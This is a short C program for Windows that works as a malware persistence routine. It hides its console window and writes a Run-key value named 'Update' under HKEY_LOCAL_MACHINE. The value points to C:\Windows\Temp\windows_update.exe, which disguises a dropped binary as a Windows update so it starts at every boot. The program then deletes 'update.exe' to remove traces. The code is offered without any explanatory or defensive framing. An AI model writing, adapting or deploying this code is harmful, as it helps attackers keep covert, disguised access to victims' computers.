#include<windows.h>
#include<stdio.h>
int persistence(const char *reg_key, const char *value){
    HKEY key;
    LSTATUS rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(reg_key), 0, KEY_SET_VALUE, &key);
    if(ERROR_SUCCESS != rc){
        printf("RegOpenKeyEx failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }
    rc = RegSetValueEx(key, TEXT("Update"), 0, REG_SZ, (const BYTE*)value, (lstrlen(value)+1) * sizeof(TCHAR));
    if(ERROR_SUCCESS != rc){
        printf("RegSetValueExA failed: %u\n", GetLastError());
        RegCloseKey(key);
        return -1;
    }  
    rc = RegCloseKey(key);
    if(ERROR_SUCCESS != rc){
        printf("RegCloseKey failed: %u\n", GetLastError());
        return -1;
    }
    WinExec("del update.exe", 0);
    return 0;
}
int main(){
    FreeConsole();
    persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run","C:\\Windows\\Temp\\windows_update.exe");
}